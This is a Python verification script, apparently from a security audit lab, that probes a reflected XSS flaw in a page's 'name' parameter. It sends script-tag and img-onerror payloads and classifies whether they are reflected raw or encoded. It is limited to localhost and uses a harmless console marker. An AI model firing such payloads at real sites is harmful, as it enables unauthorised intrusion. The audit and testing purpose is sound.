#!/usr/bin/env python3
# XSS-001 verification draft: reflected XSS via GET 'name' into '<pre>Hello ...</pre>' (line 6).
# Lab scope only: localhost / 127.0.0.1 / ::1. http.client never follows redirects.
# Harmless marker only (console.log). No Cookie reading, no exfiltration.
#
# Usage:
#   python poc_xss_001.py --base-url http://127.0.0.1 --page-path /<page-path>/ \
#       --cookie 'PHPSESSID=<session>' --marker LLM_LAB_XSS
#
# --page-path is NOT in the audited snippet: supply the real deployment path.
# --cookie is optional: the outer handler starts a login session, so it may be required.
import argparse
import http.client
import html
import sys
from urllib.parse import urlsplit, urlencode

LOCAL_HOSTS = {'localhost', '127.0.0.1', '::1'}
HELLO_OPEN = '<pre>Hello '
HELLO_CLOSE = '</pre>'


def parse_args():
    p = argparse.ArgumentParser(description='XSS-001 local verification draft')
    p.add_argument('--base-url', default='http://127.0.0.1')
    p.add_argument('--page-path', required=True, help='page path (not present in the audited snippet)')
    p.add_argument('--cookie', default='', help='optional session cookie; never commit or print it')
    p.add_argument('--marker', default='LLM_LAB_XSS')
    p.add_argument('--timeout', type=float, default=10.0)
    return p.parse_args()


def check_target(base_url):
    parts = urlsplit(base_url)
    if parts.scheme not in ('http', 'https'):
        raise SystemExit('refused: only http/https allowed, got %r' % (parts.scheme,))
    if (parts.hostname or '') not in LOCAL_HOSTS:
        raise SystemExit('refused: host must be localhost/127.0.0.1/::1, got %r' % (parts.hostname,))
    return parts.scheme, parts.hostname, parts.port


def build_payloads(marker):
    q = chr(39)
    return [
        ('script', '<script>console.log(' + q + marker + q + ')</script>'),
        ('img', '<img src=x onerror=console.log(' + q + marker + q + ')>'),
    ]


def http_get(scheme, host, port, path, cookie, timeout):
    cls = http.client.HTTPSConnection if scheme == 'https' else http.client.HTTPConnection
    conn = cls(host, port, timeout=timeout)
    headers = {'Accept': 'text/html', 'User-Agent': 'llm-lab-xss001-draft'}
    if cookie:
        headers['Cookie'] = cookie
    try:
        conn.request('GET', path, headers=headers)
        resp = conn.getresponse()
        return resp.status, resp.read().decode('utf-8', 'replace')
    finally:
        conn.close()


def hello_region(body):
    start = body.find(HELLO_OPEN)
    if start < 0:
        return None
    start += len(HELLO_OPEN)
    end = body.find(HELLO_CLOSE, start)
    return None if end < 0 else body[start:end]


def classify(region, marker):
    if region is None:
        return 'NOT_RENDERED', 'no <pre>Hello ...</pre> area found in the response'
    if '<script>' in region and marker in region:
        return 'RAW_REFLECTION', 'raw <script> marker inside the Hello area'
    decoded = html.unescape(region)
    if '&lt;script&gt;' in region and marker in decoded:
        return 'HTML_ENCODED', 'marker only present after HTML-decoding'
    if marker in region or marker in decoded:
        return 'OTHER_CONTEXT', 'marker reflected but not as a recognizable script tag'
    return 'MARKER_ABSENT', 'marker missing from the Hello area'


def main():
    args = parse_args()
    scheme, host, port = check_target(args.base_url)
    if not args.page_path.startswith('/'):
        raise SystemExit('--page-path must start with /')
    print('[i] target %s://%s%s%s (local only)' % (scheme, host, ':' + str(port) if port else '', args.page_path))
    if args.cookie:
        print('[i] session cookie supplied (value not printed)')
    for label, payload in build_payloads(args.marker):
        query = urlencode({'name': payload})
        sep = '&' if '?' in args.page_path else '?'
        path = args.page_path + sep + query
        status, body = http_get(scheme, host, port, path, args.cookie, args.timeout)
        region = hello_region(body)
        result, detail = classify(region, args.marker)
        print('[probe=%s] HTTP %s' % (label, status))
        print('  parsed-area   : %r' % (region,))
        print('  classification: %s (%s)' % (result, detail))
        if result == 'RAW_REFLECTION':
            print('  note: payload reflected unencoded; browser execution still needs manual confirmation')
        elif result == 'HTML_ENCODED':
            print('  note: output encoding observed; script execution not expected on this path')
    print('manual browser step: load the same URL, watch DevTools Console for %s, save screenshot' % args.marker)
    print('cleanup: reflected request only, no stored record; discard the test browser tab/session')


if __name__ == '__main__':
    try:
        main()
    except OSError as exc:
        sys.exit('request/environment error: %s' % exc)
